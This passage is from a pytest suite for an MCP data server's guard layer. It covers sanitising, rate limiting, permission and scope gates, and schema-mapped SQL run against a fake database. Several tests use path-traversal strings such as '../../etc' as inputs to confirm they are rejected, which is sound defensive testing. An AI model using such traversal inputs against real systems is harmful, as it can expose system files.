"""Tests for server.py's guard pipeline (_sanitize, _check_rate, _guarded) and
the store_* tool endpoints running through it. Previously untested (L-TEST-01).

Runs in stdio mode (the pytest process never sets --serve), so _gate() takes
its original path: app_id comes from the tool call itself, same as before
L-AUTH-02 — that finding is serve-mode-only and is covered separately by
test_identity_binding.py plus the manual serve-mode gate exercises done
during that fix.
"""
import json

import pytest
from psycopg2.extras import Json
from willow_mcp import kb_curate as kbc
from willow_mcp import server


@pytest.fixture(autouse=True)
def _fresh_rate_buckets():
    """_buckets is a module-global — reset between tests so rate-limit state
    from one test can't bleed into the next."""
    server._buckets.clear()
    yield
    server._buckets.clear()


@pytest.fixture
def app_id(tmp_path, monkeypatch):

    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "testapp"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["full_access"]}))
    return "testapp"


# ── _sanitize ──────────────────────────────────────────────────────────────

def test_sanitize_strips_null_bytes():
    cleaned, problem = server._sanitize({"content": "hello\x00world"})
    assert problem is None
    assert cleaned["content"] == "helloworld"


def test_sanitize_strips_null_bytes_in_arbitrary_record_fields():
    # NUL must be stripped from ANY stored string, not just the reserved keys —
    # a value nested in a record dict, a list item, or a deeper field.
    cleaned, problem = server._sanitize({"record": {
        "field": "before\x00after",
        "nested": {"deep": "a\x00b"},
        "list": ["x\x00y", {"k": "m\x00n"}],
    }})
    assert problem is None
    assert cleaned["record"]["field"] == "beforeafter"
    assert cleaned["record"]["nested"]["deep"] == "ab"
    assert cleaned["record"]["list"] == ["xy", {"k": "mn"}]


def test_sanitize_strips_nulls_in_context_and_value_and_body():
    for key in ("context", "value", "body"):
        cleaned, problem = server._sanitize({key: {"s": "p\x00q"}})
        assert problem is None and cleaned[key]["s"] == "pq"


def test_sanitize_rejects_oversized_record():
    big = {"blob": "x" * (600 * 1024)}
    cleaned, problem = server._sanitize({"record": big})
    assert problem is not None
    assert "512KB" in problem


def test_sanitize_rejects_path_traversal_collection():
    cleaned, problem = server._sanitize({"collection": "../../etc"})
    assert problem is not None
    assert "path" in problem.lower()


def test_sanitize_rejects_too_many_tags():
    cleaned, problem = server._sanitize({"tags": [f"t{i}" for i in range(40)]})
    assert problem is not None


def test_sanitize_truncates_oversized_topic():
    big = "x" * (70 * 1024)
    cleaned, problem = server._sanitize({"topic": big})
    assert problem is None
    assert len(cleaned["topic"].encode("utf-8")) <= 64 * 1024


def test_sanitize_rejects_too_many_sources():
    cleaned, problem = server._sanitize({"sources": [f"s{i}" for i in range(40)]})
    assert problem is not None
    assert "sources" in problem


def test_sanitize_rejects_oversized_source_item():
    cleaned, problem = server._sanitize({"sources": ["x" * 200]})
    assert problem is not None
    assert "sources" in problem


# ── _check_rate ────────────────────────────────────────────────────────────

def test_check_rate_allows_burst_then_limits():
    ok_count = 0
    for _ in range(15):
        allowed, _ = server._check_rate("rate-test-app")
        if allowed:
            ok_count += 1
    # burst capacity is 10 tokens; the 11th+ immediate call should be limited
    assert ok_count == 10


# ── _gate: invalid app_id ──────────────────────────────────────────────────

def test_gate_reports_invalid_app_id_not_a_fake_path():
    # A malformed app_id is rejected on its shape, with a clear message — not a
    # generic "not permitted" that splices the bad id into a manifest path.
    eff, err = server._gate("bad/../app", "store_get")
    assert eff is None
    assert "invalid app_id" in err["error"]
    assert "manifest exists at" not in err["error"]      # no fabricated path
    # a well-formed but unmanifested id still gets the ordinary gate-denied path
    eff2, err2 = server._gate("nosuchapp", "store_get")
    assert eff2 is None and "not permitted" in err2["error"]


# ── _guarded / tool pipeline (stdio mode) ──────────────────────────────────

def test_store_put_and_get_round_trip(app_id):
    put_result = server.store_put(app_id=app_id, collection="col", record={"v": 1})
    assert "id" in put_result
    got = server.store_get(app_id=app_id, collection="col", record_id=put_result["id"])
    assert got["v"] == 1


def test_store_delete_is_durable_through_store_put(app_id):
    """End-to-end on the tool surface: the delete/re-put resurrection (box audit
    P0). store_put used INSERT OR REPLACE, which dropped the row and let the
    omitted `deleted` column fall back to its schema default of 0 — so a caller
    could undelete any record it knew the id of, with a fresh created_at, using
    only store_write. Now the tombstone holds and the attempt is loud."""
    put_result = server.store_put(app_id=app_id, collection="col", record={"v": "original"})
    rid = put_result["id"]
    assert server.store_delete(app_id=app_id, collection="col", record_id=rid)["deleted"] is True

    # the re-put is accepted (refusing it would brick every stable-id writer
    # after a purge — see test_put_into_a_tombstone_does_not_raise) but it
    # lands in the tombstone: the record stays unreadable through the tool.
    server.store_put(app_id=app_id, collection="col",
                     record={"v": "ATTACKER"}, record_id=rid)

    assert "error" in server.store_get(app_id=app_id, collection="col", record_id=rid)
    assert all(r.get("v") != "ATTACKER"
               for r in server.store_list(app_id=app_id, collection="col")["items"])


def test_guarded_denies_unpermitted_app_id(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "readonly"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["store_read"]}))

    result = server.store_put(app_id="readonly", collection="col", record={"v": 1})
    assert "error" in result
    assert "denied" in result["error"]


def test_guarded_denies_missing_manifest():
    result = server.store_get(app_id="totally-unknown-app", collection="col", record_id="x")
    assert "error" in result
    assert "denied" in result["error"]


def test_guarded_gate_precedes_sanitize(tmp_path, monkeypatch):
    """B-16: an unpermitted caller gets a permission denial as the FIRST signal,
    not a sanitizer error for a call it was never allowed to make. The illegal
    collection here would trip _sanitize; the unpermitted app would trip _gate.
    Gate runs first, so the denial wins."""
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "readonly"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["store_read"]}))

    result = server.store_put(app_id="readonly", collection="../evil", record={"v": 1})
    assert "denied" in result["error"]
    assert "sanitize" not in result["error"]


def test_guarded_sanitize_runs_after_gate_for_permitted_app(app_id):
    """B-16 control: a permitted caller with an illegal payload still reaches
    the sanitizer — gate-first must not skip sanitization for allowed calls."""
    result = server.store_put(app_id=app_id, collection="../evil", record={"v": 1})
    assert "sanitize" in result["error"]


# ── store_scope / cross-app isolation (B-24 / SECURITY_AUDIT.md L-ISO-01) ───
#
# Unscoped apps (no `store_scope` in their manifest) must keep today's
# unrestricted behavior — the SOIL store is deliberately shared with the
# wider fleet by default (README's "share data" note). These tests exercise
# the opt-in denial path a scoped app now gets, and confirm an unscoped app
# is unaffected.

@pytest.fixture
def scoped_app_id(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "scopedapp"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({
        "permissions": ["full_access"],
        "store_scope": ["b24_scoped_*"],
    }))
    return "scopedapp"


def test_store_put_denied_outside_scope(scoped_app_id):
    result = server.store_put(app_id=scoped_app_id, collection="agents", record={"v": 1})
    assert "error" in result
    assert "collection_denied" in result["error"]


def test_store_put_allowed_inside_scope(scoped_app_id):
    result = server.store_put(app_id=scoped_app_id, collection="b24_scoped_notes", record={"v": 1})
    assert "id" in result


def test_store_get_denied_outside_scope(scoped_app_id):
    result = server.store_get(app_id=scoped_app_id, collection="agents", record_id="x")
    assert result.get("error", "").startswith("collection_denied")


def test_store_list_denied_outside_scope_is_list_shaped(scoped_app_id):
    result = server.store_list(app_id=scoped_app_id, collection="agents")
    assert isinstance(result, dict)
    assert len(result["items"]) == 1
    assert "collection_denied" in result["items"][0]["error"]


def test_store_search_denied_outside_scope_is_list_shaped(scoped_app_id):
    result = server.store_search(app_id=scoped_app_id, collection="agents", query="x")
    assert isinstance(result, dict)
    assert "collection_denied" in result["items"][0]["error"]


def test_store_update_denied_outside_scope(scoped_app_id):
    result = server.store_update(app_id=scoped_app_id, collection="agents", record_id="x", record={"v": 1})
    assert "collection_denied" in result["error"]


def test_store_delete_denied_outside_scope(scoped_app_id):
    result = server.store_delete(app_id=scoped_app_id, collection="agents", record_id="x")
    assert "collection_denied" in result["error"]


def test_store_search_all_confines_to_scope(scoped_app_id):
    # Write into an in-scope collection via the scoped app, and directly into
    # an out-of-scope one via an unscoped admin app, then confirm search_all
    # for the scoped app only ever sees its own slice.
    server.store_put(app_id=scoped_app_id, collection="b24_scoped_notes", record={"content": "b24marker findme"})

    admin_dir = None
    import os
    apps_root = os.environ["WILLOW_MCP_APPS_ROOT"]
    admin_dir = os.path.join(apps_root, "unscopedadmin")
    os.makedirs(admin_dir, exist_ok=True)
    with open(os.path.join(admin_dir, "manifest.json"), "w") as f:
        f.write(json.dumps({"permissions": ["full_access"]}))
    server.store_put(app_id="unscopedadmin", collection="agents", record={"content": "b24marker findme"})

    scoped_results = server.store_search_all(app_id=scoped_app_id, query="b24marker")
    assert {r.get("_collection") for r in scoped_results["items"]} == {"b24_scoped_notes"}

    unscoped_results = server.store_search_all(app_id="unscopedadmin", query="b24marker")
    assert {r.get("_collection") for r in unscoped_results["items"]} == {"b24_scoped_notes", "agents"}


def test_store_put_unscoped_app_unaffected(app_id):
    """Control: an app with no store_scope keeps full, unrestricted access —
    this fix must not regress the shared-fleet-store default."""
    result = server.store_put(app_id=app_id, collection="agents", record={"v": 1})
    assert "id" in result


# ── knowledge_search / kb_at / kb_startup_continuity (schema-adapted, docs/design/schema-adaptation.md §9 step 2) ──
#
# These tools build their SQL from a schema_profile mapping instead of
# hardcoded column names (see tests/test_schema_profile.py for the mapping
# logic itself). These tests exercise the tool-level wiring: gate -> Postgres
# unavailable -> table_not_found -> schema_unusable -> the actual mapped
# query and result shape, using a fake Postgres connection that just enough
# emulates the two query shapes these tools issue (information_schema
# introspection, then the mapped SELECT) to verify both the SQL built and
# the result returned, without touching a real database.

class _FakePgCursor:
    def __init__(self, conn):
        self._conn = conn
        self._result: list = []

    def execute(self, sql, params=None):
        self._conn.executed.append((sql, params))
        if "information_schema.columns" in sql:
            self._result = list(self._conn.columns)
        else:
            self._result = list(self._conn.canned_rows)

    def fetchall(self):
        return list(self._result)

    def fetchone(self):
        return self._result[0] if self._result else None

    @property
    def rowcount(self):
        return len(self._result)

    def close(self):
        pass


class _FakePg:
    """columns: list[(name, data_type)] as information_schema would return.
    canned_rows: list[tuple] returned verbatim for any non-introspection
    query — good enough to test result-shape wiring; SQL-shape assertions
    (which columns, which WHERE clauses) are checked against `.executed`
    directly rather than by emulating real filtering."""

    def __init__(self, columns, canned_rows=None):
        self.columns = columns
        self.canned_rows = canned_rows or []
        self.executed: list = []

    def cursor(self):
        return _FakePgCursor(self)

    def get_dsn_parameters(self):
        return {"host": "test-host", "dbname": "test-db"}


_KNOWLEDGE_COLUMNS_NO_TAGS = [
    ("id", "text"), ("content", "jsonb"), ("domain", "text"), ("source_type", "text"),
]


def test_knowledge_search_empty_query_short_circuits(app_id):
    assert server.knowledge_search(app_id=app_id, query="   ") == {"results": []}


def test_postgres_unavailable_call_sites_all_use_the_shared_helper():
    """Found live (2026-07-31): 19 call sites each hand-wrote
    {"error": "postgres_unavailable"} with no next step, while
    diagnostic_summary's own Postgres check had good phrasing sitting
    unused. Consolidated into server._postgres_unavailable(); this pins
    that no call site regresses back to a bare hand-written literal that
    would silently drift from the shared one again."""
    import inspect

    source = inspect.getsource(server)
    assert 'return {"error": "postgres_unavailable"}' not in source
    assert server._postgres_unavailable()["error"] == "postgres_unavailable"
    assert "diagnostic_summary" in server._postgres_unavailable()["detail"]


def test_knowledge_search_postgres_unavailable(app_id, monkeypatch):
    monkeypatch.setattr(server, "get_pg", lambda: None)
    result = server.knowledge_search(app_id=app_id, query="hi")
    assert result["error"] == "postgres_unavailable"
    assert "diagnostic_summary" in result["detail"]


def test_knowledge_search_table_not_found(app_id, monkeypatch):
    fake = _FakePg(columns=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.knowledge_search(app_id=app_id, query="hi")
    assert result == {"error": "table_not_found", "table": "knowledge"}


def test_knowledge_search_schema_unusable_without_id_or_content(app_id, monkeypatch):
    fake = _FakePg(columns=[("domain", "text")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.knowledge_search(app_id=app_id, query="hi")
    assert "schema_unusable" in result["error"]


def test_knowledge_search_maps_columns_casts_jsonb_and_returns_shaped_results(app_id, monkeypatch):
    fake = _FakePg(
        columns=_KNOWLEDGE_COLUMNS_NO_TAGS,
        canned_rows=[("A1", {"x": 1}, "general", "session")],
    )
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.knowledge_search(app_id=app_id, query="hello world", domain="general", limit=5)

    assert result["results"] == [
        {"id": "A1", "content": {"x": 1}, "domain": "general", "source": "session", "tags": None}
    ]
    assert result["_unmapped"] == ["tags"]

    select_sql, params = fake.executed[-1]
    assert '"content"::text ILIKE' in select_sql   # jsonb column cast for ILIKE
    assert '"source_type" AS "source"' in select_sql  # alias mapping applied
    assert '"domain" = %s' in select_sql           # domain filter, since domain is mapped
    assert "tags" not in select_sql                # never reference an unmapped column
    assert params[-2:] == ["general", 5]           # domain filter param, then limit


def test_knowledge_search_skips_domain_filter_when_domain_unmapped(app_id, monkeypatch):
    fake = _FakePg(columns=[("id", "text"), ("content", "jsonb")], canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    server.knowledge_search(app_id=app_id, query="hi", domain="general")

    select_sql, params = fake.executed[-1]
    assert "domain" not in select_sql
    assert "general" not in params


def test_knowledge_search_denied_without_permission(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "writeonly"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["knowledge_write"]}))

    result = server.knowledge_search(app_id="writeonly", query="hi")
    assert "denied" in result["error"]


def test_kb_at_not_found(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS, canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    assert server.kb_at(app_id=app_id, atom_id="ghost") == {"error": "not_found"}


def test_kb_at_found_surfaces_unmapped_and_filters_by_mapped_id_column(app_id, monkeypatch):
    fake = _FakePg(
        columns=_KNOWLEDGE_COLUMNS_NO_TAGS,
        canned_rows=[("A1", {"x": 1}, "general", "session")],
    )
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.kb_at(app_id=app_id, atom_id="A1")

    assert result["id"] == "A1"
    assert result["tags"] is None
    assert result["_unmapped"] == ["tags"]
    select_sql, params = fake.executed[-1]
    assert 'WHERE "id" = %s' in select_sql
    assert params == ("A1",)


def test_kb_at_schema_unusable_without_id_column(app_id, monkeypatch):
    fake = _FakePg(columns=[("content", "jsonb")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.kb_at(app_id=app_id, atom_id="x")
    assert "schema_unusable" in result["error"]


def test_kb_startup_continuity_uses_domain_only_when_no_tags_and_no_jsonb_content(app_id, monkeypatch):
    # domain mapped, tags unmapped, and NO jsonb column to hold tags in
    # (content maps to a text column here) -> domain filter only, no tags path.
    fake = _FakePg(columns=[("id", "text"), ("body", "text"), ("domain", "text"),
                            ("source_type", "text")], canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.kb_startup_continuity(app_id=app_id, limit=5)

    assert result["_continuity_filter"] == ["domain='continuity'"]
    where_sql, params = fake.executed[-1]
    assert '"domain" = %s' in where_sql
    assert "->'tags'" not in where_sql
    assert " OR " not in where_sql


def test_kb_startup_continuity_reads_jsonb_content_tags_when_tags_column_unmapped(app_id, monkeypatch):
    # B-15: no top-level tags column, but a jsonb 'content' blob holds tags.
    # Continuity atoms must be read from content->'tags' rather than silently
    # missed. Domain is mapped too, so the two conditions are OR'd.
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS, canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.kb_startup_continuity(app_id=app_id, limit=5)

    assert result["_unmapped"] == ["tags"]
    assert 'content->tags @> ["continuity"]' in result["_continuity_filter"]
    where_sql, params = fake.executed[-1]
    assert '"domain" = %s' in where_sql
    assert '"content"->\'tags\' @> %s::jsonb' in where_sql
    assert " OR " in where_sql
    # the jsonb-array param and the limit are the trailing bind params
    assert params[-2:] == ['["continuity"]', 5]


def test_kb_startup_continuity_prefers_top_level_tags_column_over_jsonb(app_id, monkeypatch):
    # a real top-level tags column wins; the jsonb blob path is not consulted.
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS + [("tags", "text")], canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    server.kb_startup_continuity(app_id=app_id, limit=5)

    where_sql, params = fake.executed[-1]
    assert '"domain" = %s' in where_sql
    assert '"tags"::text LIKE %s' in where_sql
    assert "->'tags'" not in where_sql   # jsonb path skipped when a tags column exists
    assert " OR " in where_sql


def test_kb_startup_continuity_top_level_tags_jsonb_uses_text_cast(app_id, monkeypatch):
    # A top-level tags column that is jsonb (the fresh willow-mcp DDL) must not
    # be queried with a bare LIKE — jsonb has no ~~ operator, which errored
    # ('operator does not exist: jsonb ~~'). The ::text cast handles both a
    # JSON-string text column and native jsonb.
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS + [("tags", "jsonb")], canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    server.kb_startup_continuity(app_id=app_id, limit=5)

    where_sql, _ = fake.executed[-1]
    assert '"tags"::text LIKE %s' in where_sql   # cast, never a bare jsonb LIKE
    assert '"tags" LIKE' not in where_sql


def test_kb_startup_continuity_fails_closed_when_no_domain_tags_or_jsonb_content(app_id, monkeypatch):
    # no domain, no tags column, no jsonb content blob -> nothing to filter on.
    fake = _FakePg(columns=[("id", "text"), ("body", "text"), ("source_type", "text")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.kb_startup_continuity(app_id=app_id, limit=5)

    assert result["atoms"] == []
    assert "_note" in result
    assert {"domain", "tags"} <= set(result["_unmapped"])
    # no continuity SELECT was issued against an unidentifiable condition
    # (only information_schema introspection ran, never a query on `knowledge`)
    assert not any("FROM knowledge WHERE" in sql for sql, _ in fake.executed)


def test_kb_startup_continuity_schema_unusable_without_id_column(app_id, monkeypatch):
    fake = _FakePg(columns=[("domain", "text")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.kb_startup_continuity(app_id=app_id)
    assert "schema_unusable" in result["error"]


# ── schema_confirm_mapping and the write-path gate (docs/design/schema-adaptation.md §3.4/§9 step 3) ──
#
# knowledge_ingest / kb_journal / kb_promote must refuse to write until the
# table's mapping is confirmed (schema_confirm_mapping). These tests use the
# same _FakePg double as the read-path tests; confirming and then writing
# against the *same* fake instance keeps db_fingerprint consistent between
# the two calls, the way a real Postgres connection would.

def test_schema_confirm_mapping_unknown_table(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.schema_confirm_mapping(app_id=app_id, table="not_a_real_table")
    assert "unknown_table" in result["error"]


def test_schema_confirm_mapping_postgres_unavailable(app_id, monkeypatch):
    monkeypatch.setattr(server, "get_pg", lambda: None)
    result = server.schema_confirm_mapping(app_id=app_id, table="knowledge")
    assert result["error"] == "postgres_unavailable"
    assert "diagnostic_summary" in result["detail"]


def test_schema_confirm_mapping_marks_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.schema_confirm_mapping(app_id=app_id, table="knowledge")
    assert result["confirmed"] is True
    assert result["fields"]["source"]["column"] == "source_type"


def test_schema_confirm_mapping_applies_overrides(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.schema_confirm_mapping(app_id=app_id, table="knowledge", overrides={"tags": None})
    assert result["fields"]["tags"] == {"column": None, "tier": "unmapped", "confidence": 0.0, "data_type": None}


def test_schema_confirm_mapping_confirm_includes_sample(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS,
                   canned_rows=[("A1", {"blob": 1}, "general", "session")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.schema_confirm_mapping(app_id=app_id, table="knowledge")
    assert result["confirmed"] is True
    assert "sample" in result  # confirmation is never blind


def test_schema_confirm_mapping_preview_does_not_confirm(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS,
                   canned_rows=[("A1", {"blob": 1}, "general", "session")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.schema_confirm_mapping(app_id=app_id, table="knowledge", preview=True)
    assert result["preview"] is True
    assert result["confirmed"] is False
    assert "sample" in result


def test_schema_confirm_mapping_denied_without_schema_admin(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "writer_only"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["knowledge_write"]}))

    result = server.schema_confirm_mapping(app_id="writer_only", table="knowledge")
    assert "denied" in result["error"]


def test_knowledge_ingest_refuses_until_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)

    result = server.knowledge_ingest(app_id=app_id, content="hello")

    assert "unconfirmed_schema" in result["error"]
    # nothing beyond the introspection query ran — no write attempted
    assert len(fake.executed) == 1


def test_knowledge_ingest_writes_mapped_columns_and_casts_jsonb_after_confirm(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    result = server.knowledge_ingest(app_id=app_id, content="hello world", domain="general", source="session")

    assert "id" in result
    insert_sql, params = fake.executed[-1]
    assert insert_sql.startswith("INSERT INTO knowledge")
    assert '"source_type"' in insert_sql   # alias-mapped column used, not the canonical name
    assert '"tags"' not in insert_sql      # never reference an unmapped column
    # content targets a jsonb column -> must be wrapped for psycopg2 to adapt as JSON
    content_param = params[1]
    assert isinstance(content_param, Json)
    assert content_param.adapted == "hello world"


def test_knowledge_ingest_schema_unusable_when_content_unmapped_even_if_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=[("id", "text"), ("domain", "text")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")  # confirms with content unmapped

    result = server.knowledge_ingest(app_id=app_id, content="hello")
    assert "schema_unusable" in result["error"]


def test_kb_journal_refuses_until_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.kb_journal(app_id=app_id, content="note")
    assert "unconfirmed_schema" in result["error"]


def test_kb_journal_forces_domain_journal_and_unions_tags_after_confirm(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS + [("tags", "text")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    result = server.kb_journal(app_id=app_id, content="note", tags=["extra"])

    assert result["domain"] == "journal"
    insert_sql, params = fake.executed[-1]
    assert '"tags"' in insert_sql
    assert set(params[-1]) == {"journal", "extra"}


def test_kb_journal_read_returns_journal_atoms_newest_first(app_id, monkeypatch):
    fake = _FakePg(
        columns=_KNOWLEDGE_COLUMNS_NO_TAGS
        + [("tags", "text"), ("created_at", "timestamp with time zone")],
        canned_rows=[
            ("B2", "second", "journal", "watcher", None, "2026-09-01T02:00:00+00:00"),
            ("B1", "first", "journal", "operator", None, "2026-09-01T01:00:00+00:00"),
        ],
    )
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    atoms = server.kb_journal_read(app_id=app_id, limit=10)

    read_sql, read_params = fake.executed[-1]
    assert '"domain" = %s' in read_sql
    assert read_params[0] == "journal"
    assert [a["id"] for a in atoms] == ["B2", "B1"]
    assert atoms[0]["content"] == "second"
    assert atoms[0]["created_at"].startswith("2026-09-01T02:00:00")


def test_kb_journal_read_since_id_trims_newer_only(app_id, monkeypatch):
    fake = _FakePg(
        columns=_KNOWLEDGE_COLUMNS_NO_TAGS
        + [("tags", "text"), ("created_at", "timestamp with time zone")],
        canned_rows=[
            ("B3", "third", "journal", "watcher", None, "2026-09-01T03:00:00+00:00"),
            ("B2", "second", "journal", "watcher", None, "2026-09-01T02:00:00+00:00"),
            ("B1", "first", "journal", "operator", None, "2026-09-01T01:00:00+00:00"),
        ],
    )
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    atoms = server.kb_journal_read(app_id=app_id, since_id="B2")

    assert [a["id"] for a in atoms] == ["B3"]


def test_kb_promote_refuses_until_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    result = server.kb_promote(app_id=app_id, atom_id="A1", domain="general")
    assert "unconfirmed_schema" in result["error"]


def test_kb_promote_updates_mapped_columns_after_confirm(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS, canned_rows=[("A1",)])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    result = server.kb_promote(app_id=app_id, atom_id="A1", domain="archived")

    assert result == {"id": "A1", "domain": "archived"}
    update_sql, params = fake.executed[-1]
    assert 'UPDATE knowledge SET "domain" = %s WHERE "id" = %s' in update_sql
    assert params == ("archived", "A1")


def test_kb_promote_schema_unusable_when_domain_unmapped_even_if_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=[("id", "text"), ("content", "jsonb")])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    result = server.kb_promote(app_id=app_id, atom_id="A1", domain="general")
    assert "schema_unusable" in result["error"]


_KNOWLEDGE_COLUMNS_WITH_TAGS = _KNOWLEDGE_COLUMNS_NO_TAGS + [("tags", "jsonb")]


def _curator_app(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
